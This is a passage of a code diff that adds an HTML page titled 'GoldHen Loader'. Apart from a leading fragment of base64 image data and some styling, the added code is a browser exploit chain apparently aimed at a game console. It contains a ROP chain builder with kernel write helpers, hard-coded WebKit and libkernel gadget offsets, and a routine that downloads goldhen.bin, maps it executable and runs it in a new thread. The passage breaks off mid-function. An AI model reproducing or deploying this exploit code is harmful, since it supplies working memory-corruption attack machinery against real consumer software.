/gXUuX4cd8rMwYw+KHUbidK3PyD180rkuZMAkpn9mUakNK5P/fvFqJxOAs8j5eoTFMHHwyHS+AAVFs1oFPcoStE8OV0SzH2+BBKHXgqchxQptyPZjINDtqhF57ebUFG6V9CyNZlr0OUrx6Fc8DmcP55D7vDStn0bygHjtQrSUvsWvxdwcGgr/h9kaVbj1AxJ1wAAAABJRU5ErkJggg==", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJ4AAACUCAYAAABiHpAdAAAB5UlEQVR4nO3YsU3DYBRG0ReUGrFNSmiYipq9oGQbNvipKBM3ka8Un9M+WfqKK9nyaa21Bnb2VA/gmIRHQngkhEdCeCSER+K8cf+cmZ89hvBwLjPzce142viP9zYz3/dexCG8zszXtePWq/blrlM4kpvt+MYjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiMhPBLCIyE8EsIjITwSwiOxFd7vLit4RDfbOW88/D4zz/fbwoFcbh1Pa6211xL45xuPhPBICI+E8EgIj4TwSPwBW2ITqOgwmh4AAAAASUVORK5CYII=", "data:image/png;base64,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", ];
-            let firstImage = document.createElement("img"),
-                secondImage = document.createElement("img"),
-                thirdImage = document.createElement("img"),
-                fourthImage = document.createElement("img");
-            let orderedImages = images.sort(() => Math.random() - 0.5);
-            firstImage.src = orderedImages[0];
-            secondImage.src = orderedImages[1];
-            thirdImage.src = orderedImages[2];
-            fourthImage.src = orderedImages[3];
-            let container = document.getElementById("container");
-            container.appendChild(firstImage);
-            container.appendChild(secondImage);
-            container.appendChild(thirdImage);
-            container.appendChild(fourthImage);
+svg {
+  width: 70%;
+}
 
-            function allset() {
-                document.getElementById("container").style.display = "none";
-                document.getElementsByClassName("loaded")[0].style.display = "block";
-                document.getElementById("progress").style.display = "none";
-                ShutDown();
-            }
+.progress {
+color: #ffffff;
+overflow: hidden;
+position: fixed;
+top: 50%;
+left: 53%;
+font-size: 22px;
+font-family: sans-serif;
+transform: translate(-50%, -50%);
+}
+		</style>
+		<meta charset="utf-8">
+		<title>GoldHen Loader</title>	
+	</head>
+	
+	<body onload=setTimeout(poc,500)>
 
-            function disableUSB() {
-                var getpl = new XMLHttpRequest();
-                getpl.open("POST", "./usboff", true);
-                getpl.send(null);
-            }
+		<div id="wrapper">
 
-            function ShutDown() {
-                var getpl = new XMLHttpRequest();
-                getpl.open("POST", "./sleep", true);
-                getpl.send(null);
-            }
+			<div id="triangle">
+			  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 129 115">
+				<defs />
+				<path fill="#FFF" d="M64.5 0L129 115H0L64.5 0zm0 24.531L20.489 103h88.021L64.5 24.531z" /></svg>
+			</div>
+		  
+			<div id="circle">
+			  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 129 129">
+				<defs />
+				<path fill="#FFF" d="M64.5 0C100.122 0 129 28.878 129 64.5S100.122 129 64.5 129 0 100.122 0 64.5 28.878 0 64.5 0zm0 12C35.505 12 12 35.505 12 64.5S35.505 117 64.5 117 117 93.495 117 64.5 93.495 12 64.5 12z" /></svg>
+			</div>
+		  
+			<div id="cross">
+			  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 110">
+				<defs />
+				<path fill="#FFF" d="M101 .515L109.485 9l-46 46 46 46-8.485 8.485-46-46-46 46L.515 101l46-46-46-46L9 .515l46 46 46-46z" /></svg>
+			</div>
+		  
+			<div id="square">
+			  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 113 113">
+				<defs />
+				<path fill="#FFF" d="M113 0v113H0V0h113zm-12 12H12v89h89V12z" /></svg>
+			</div>
+		  </div>
+		<div id=progress class="progress">Loading Exploits...</div>
+		<script>
+		function disableUSB() {
+			var getpl = new XMLHttpRequest();
+			getpl.open("POST", "./usboff", true);
+			getpl.send(null);
+		}
+	
+		function ShutDown() {
+			var getpl = new XMLHttpRequest();
+			getpl.open("POST", "./sleep", true);
+			getpl.send(null);
+		}
+	
+		function enableUSB() {
+			var getpl = new XMLHttpRequest();
+			getpl.open("POST", "./usbon", true);
+			getpl.send(null);
+		}
+	
+		function USBWait() {
+			var xhr = new XMLHttpRequest();
+			xhr.onreadystatechange = function() {
+				if (xhr.readyState == XMLHttpRequest.DONE) {
+				wait=xhr.response;
+			}
+			}
+			xhr.open('POST', '/usbwait', false);
+			xhr.send(null);
+			return wait;
+		}
+	
+	
+		function sleep(ms) {
+			return new Promise(resolve => setTimeout(resolve, ms));
+		}	
+		function hen() {		
+			progress.innerHTML = "Loading Goldhen...";
+			var req = new XMLHttpRequest();
+			req.responseType = "arraybuffer";
+			req.open('GET','goldhen.bin');
+			req.send();
+			req.onreadystatechange = function () {
+			if (req.readyState == 4) {
+			PLD = req.response;
+			var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
+			var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
+			var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+			var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+			tmp.set(new Uint8Array(req.response), 0);
+			tmp.set(padding, req.response.byteLength);
+			var shellcode = new Uint32Array(tmp.buffer);
+			pl.set(shellcode,0);
+			var pthread = p.malloc(0x10);
+			chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+			progress.innerHTML = "Done";
+			ShutDown();
+			}
+		};
+	}
+		function int64(low, hi) {
+			this.low = (low >>> 0);
+			this.hi = (hi >>> 0);
+			this.add32inplace = function(val) {
+				var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+				var new_hi = (this.hi >>> 0);
+				if(new_lo < this.low) {
+					new_hi++;
+				}
+				this.hi = new_hi;
+				this.low = new_lo;
+			}
+			this.add32 = function(val) {
+				var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+				var new_hi = (this.hi >>> 0);
+				if(new_lo < this.low) {
+					new_hi++;
+				}
+				return new int64(new_lo, new_hi);
+			}
+			this.sub32 = function(val) {
+				var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+				var new_hi = (this.hi >>> 0);
+				if(new_lo > (this.low) & 0xFFFFFFFF) {
+					new_hi--;
+				}
+				return new int64(new_lo, new_hi);
+			}
+			this.sub32inplace = function(val) {
+				var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+				var new_hi = (this.hi >>> 0);
+				if(new_lo > (this.low) & 0xFFFFFFFF) {
+					new_hi--;
+				}
+				this.hi = new_hi;
+				this.low = new_lo;
+			}
+			this.and32 = function(val) {
+				var new_lo = this.low & val;
+				var new_hi = this.hi;
+				return new int64(new_lo, new_hi);
+			}
+			this.and64 = function(vallo, valhi) {
+				var new_lo = this.low & vallo;
+				var new_hi = this.hi & valhi;
+				return new int64(new_lo, new_hi);
+			}
+			this.toString = function(val) {
+				val = 16;
+				var lo_str = (this.low >>> 0).toString(val);
+				var hi_str = (this.hi >>> 0).toString(val);
+				if(this.hi == 0) return lo_str;
+				else lo_str = zeroFill(lo_str, 8)
+				return hi_str + lo_str;
+			}
+			return this;
+		}
+	
+		function zeroFill(number, width) {
+			width -= number.toString().length;
+			if(width > 0) {
+				return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
+			}
+			return number + "";
+		}
+	
+		function zeroFill(number, width) {
+			width -= number.toString().length;
+			if(width > 0) {
+				return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
+			}
+			return number + "";
+		}
+		const stack_sz = 0x40000;
+		const reserve_upper_stack = 0x10000;
+		const stack_reserved_idx = reserve_upper_stack / 4;
+		window.rop = function() {
+			this.stackback = p.malloc32(stack_sz / 4 + 0x8);
+			this.stack = this.stackback.add32(reserve_upper_stack);
+			this.stack_array = this.stackback.backing;
+			this.retval = this.stackback.add32(stack_sz);
+			this.count = 1;
+			this.branches_count = 0;
+			this.branches_rsps = p.malloc(0x200);
+			this.clear = function() {
+				this.count = 1;
+				this.branches_count = 0;
+				for(var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
+					this.stack_array[i + stack_reserved_idx] = 0;
+				}
+			};
+			this.pushSymbolic = function() {
+				this.count++;
+				return this.count - 1;
+			}
+			this.finalizeSymbolic = function(idx, val) {
+				if(val instanceof int64) {
+					this.stack_array[stack_reserved_idx + idx * 2] = val.low;
+					this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
+				} else {
+					this.stack_array[stack_reserved_idx + idx * 2] = val;
+					this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
+				}
+			}
+			this.push = function(val) {
+				this.finalizeSymbolic(this.pushSymbolic(), val);
+			}
+			this.push_write8 = function(where, what) {
+				this.push(gadgets["pop rdi"]);
+				this.push(where);
+				this.push(gadgets["pop rsi"]);
+				this.push(what);
+				this.push(gadgets["mov [rdi], rsi"]);
+			}
+			this.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+				if(rdi != undefined) {
+					this.push(gadgets["pop rdi"]);
+					this.push(rdi);
+				}
+				if(rsi != undefined) {
+					this.push(gadgets["pop rsi"]);
+					this.push(rsi);
+				}
+				if(rdx != undefined) {
+					this.push(gadgets["pop rdx"]);
+					this.push(rdx);
+				}
+				if(rcx != undefined) {
+					this.push(gadgets["pop rcx"]);
+					this.push(rcx);
+				}
+				if(r8 != undefined) {
+					this.push(gadgets["pop r8"]);
+					this.push(r8);
+				}
+				if(r9 != undefined) {
+					this.push(gadgets["pop r9"]);
+					this.push(r9);
+				}
+				if(this.stack.add32(this.count * 0x8).low & 0x8) {
+					this.push(gadgets["ret"]);
+				}
+				this.push(rip);
+				return this;
+			}
+			this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+				this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+				this.write_result(this.retval);
+				this.run();
+				return p.read8(this.retval);
+			}
+			this.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
+				return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+			}
+			this.get_rsp = function() {
+				return this.stack.add32(this.count * 8);
+			}
+			this.write_result = function(where) {
+				this.push(gadgets["pop rdi"]);
+				this.push(where);
+				this.push(gadgets["mov [rdi], rax"]);
+			}
+			this.write_result4 = function(where) {
+				this.push(gadgets["pop rdi"]);
+				this.push(where);
+				this.push(gadgets["mov [rdi], eax"]);
+			}
+			this.jmp_rsp = function(rsp) {
+				this.push(window.gadgets["pop rsp"]);
+				this.push(rsp);
+			}
+			this.run = function() {
+				p.launch_chain(this);
+				this.clear();
+			}
+			this.KERNEL_BASE_PTR_VAR;
+			this.set_kernel_var = function(arg) {
+				this.KERNEL_BASE_PTR_VAR = arg;
+			}
+			this.rax_kernel = function(offset) {
+				this.push(gadgets["pop rax"]);
+				this.push(this.KERNEL_BASE_PTR_VAR)
+				this.push(gadgets["mov rax, [rax]"]);
+				this.push(gadgets["pop rsi"]);
+				this.push(offset)
+				this.push(gadgets["add rax, rsi"]);
+			}
+			this.write_kernel_addr_to_chain_later = function(offset) {
+				this.push(gadgets["pop rdi"]);
+				var idx = this.pushSymbolic();
+				this.rax_kernel(offset);
+				this.push(gadgets["mov [rdi], rax"]);
+				return idx;
+			}
+			this.kwrite8 = function(offset, qword) {
+				this.rax_kernel(offset);
+				this.push(gadgets["pop rsi"]);
+				this.push(qword);
+				this.push(gadgets["mov [rax], rsi"]);
+			}
+			this.kwrite4 = function(offset, dword) {
+				this.rax_kernel(offset);
+				this.push(gadgets["pop rdx"]);
+				this.push(dword);
+				this.push(gadgets["mov [rax], edx"]);
+			}
+			this.kwrite2 = function(offset, word) {
+				this.rax_kernel(offset);
+				this.push(gadgets["pop rcx"]);
+				this.push(word);
+				this.push(gadgets["mov [rax], cx"]);
+			}
+			this.kwrite1 = function(offset, byte) {
+				this.rax_kernel(offset);
+				this.push(gadgets["pop rcx"]);
+				this.push(byte);
+				this.push(gadgets["mov [rax], cl"]);
+			}
+			this.kwrite8_kaddr = function(offset1, offset2) {
+				this.rax_kernel(offset2);
+				this.push(gadgets["mov rdx, rax"]);
+				this.rax_kernel(offset1);
+				this.push(gadgets["mov [rax], rdx"]);
+			}
+			return this;
+		};
+		var chain;
+		var kchain;
+		var kchain2;
+		var SAVED_KERNEL_STACK_PTR;
+		var KERNEL_BASE_PTR;
+		var webKitBase;
+		var webKitRequirementBase;
+		var libSceLibcInternalBase;
+		var libKernelBase;
+		var textArea = document.createElement("textarea");
+		const OFFSET_wk_vtable_first_element = 0x104F110;
+		const OFFSET_WK_memset_import = 0x000002A8;
+		const OFFSET_WK___stack_chk_fail_import = 0x00000178;
+		const OFFSET_WK_psl_builtin_import = 0xD68;
+		const OFFSET_WKR_psl_builtin = 0x33BA0;
+		const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
+		const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
+		const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
+		const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
+		const OFFSET_libcint_memset = 0x0004F810;
+		const OFFSET_libcint_setjmp = 0x000BB5BC;
+		const OFFSET_libcint_longjmp = 0x000BB616;
+		const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
+		const OFFSET_lk___stack_chk_fail = 0x0001FF60;
+		const OFFSET_lk_pthread_create = 0x00025510;
+		const OFFSET_lk_pthread_join = 0x0000AFA0;
+		var nogc = [];
+		var syscalls = {};
+		var gadgets = {};
+		var wk_gadgetmap = {
+			"ret": 0x32,
+			"pop rdi": 0x319690,
+			"pop rsi": 0x1F4D6,
+			"pop rdx": 0x986C,
+			"pop rcx": 0x657B7,
+			"pop r8": 0xAFAA71,
+			"pop r9": 0x422571,
+			"pop rax": 0x51A12,
+			"pop rsp": 0x4E293,
+			"mov [rdi], rsi": 0x1A97920,
+			"mov [rdi], rax": 0x10788F7,
+			"mov [rdi], eax": 0x9964BC,
+			"cli ; pop rax": 0x566F8,
+			"sti": 0x1FBBCC,
+			"mov rax, [rax]": 0x241CC,
+			"mov rax, [rsi]": 0x5106A0,
+			"mov [rax], rsi": 0x1EFD890,
+			"mov [rax], rdx": 0x1426A82,
+			"mov [rax], edx": 0x3B7FE4,
+			"add rax, rsi": 0x170397E,
+			"mov rdx, rax": 0x53F501,
+			"add rax, rcx": 0x2FBCD,
+			"mov rsp, rdi": 0x2048062,
+			"mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
+			"infloop": 0x7DFF,
+			"mov [rax], cl": 0xC6EAF,
+		};
+		var wkr_gadgetmap = {
+			"xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0
+		};
+		var wk2_gadgetmap = {
+			"mov [rax], rdi": 0xFFDD7,
+			"mov [rax], rcx": 0x2C9ECA,
+			"mov [rax], cx": 0x15A7D52,
+		};
+		var hmd_gadgetmap = {
+			"add [r8], r12": 0x2BCE1
+		};
+		var ipmi_gadgetmap = {
+			"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
+		};
+	
+		function userland() {
+			p.launch_chain = launch_chain;
+			p.malloc = malloc;
+			p.malloc32 = malloc32;
+			p.stringify = stringify;
+			p.array_from_address = array_from_address;
+			p.readstr = readstr;
+			var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
+			var textAreaVtable = p.read8(textAreaVtPtr);
+			webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
+			libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
+			libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
+			libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
+			libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
+			webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
+			webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
+			for(var gadget in wk_gadgetmap) {
+				window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
+			}
+			for(var gadget in wkr_gadgetmap) {
+				window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
+			}
+	
+			function get_jmptgt(address) {
+				var instr = p.read4(address) & 0xFFFF;
+				var offset = p.read4(address.add32(2));
+				if(instr != 0x25FF) {
+					return 0;
+				}
+				return address.add32(0x6 + offset);
+			}
+	
+			function malloc(sz) {
+				var backing = new Uint8Array(0x10000 + sz);
+				window.nogc.push(backing);
+				var ptr = p.read8(p.leakval(backing).add32(0x10));
+				ptr.backing = backing;
+				return ptr;
+			}
+	
+			function malloc32(sz) {
+				var backing = new Uint8Array(0x10000 + sz * 4);
+				window.nogc.push(backing);
+				var ptr = p.read8(p.leakval(backing).add32(0x10));
+				ptr.backing = new Uint32Array(backing.buffer);
+				return ptr;
+			}
+	
+			function array_from_address(addr, size) {
+				var og_array = new Uint32Array(0x1000);
+				var og_array_i = p.leakval(og_array).add32(0x10);
+				p.write8(og_array_i, addr);
+				p.write4(og_array_i.add32(0x8), size);
+				p.write4(og_array_i.add32(0xC), 0x1);
+				nogc.push(og_array);
+				return og_array;
+			}
+	
+			function stringify(str) {
+				var bufView = new Uint8Array(str.length + 1);
+				for(var i = 0; i < str.length; i++) {
+					bufView[i] = str.charCodeAt(i) & 0xFF;
+				}
+				window.nogc.push(bufView);
+				return p.read8(p.leakval(bufView).add32(0x10));
+			}
+	
+			function readstr(addr) {
+				var str = "";
+				for(var i = 0;; i++) {
+					var c = p.read1(addr.add32(i));
+					if(c == 0x0) {
+						break;
+					}
+					str += String.fromCharCode(c);
+				}
+				return str;
+			}
+			var fakeVtable_setjmp = p.malloc32(0x200);
+			var fakeVtable_longjmp = p.malloc32(0x200);
+			var original_context = p.malloc32(0x40);
+			var modified_context = p.malloc32(0x40);
+			p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
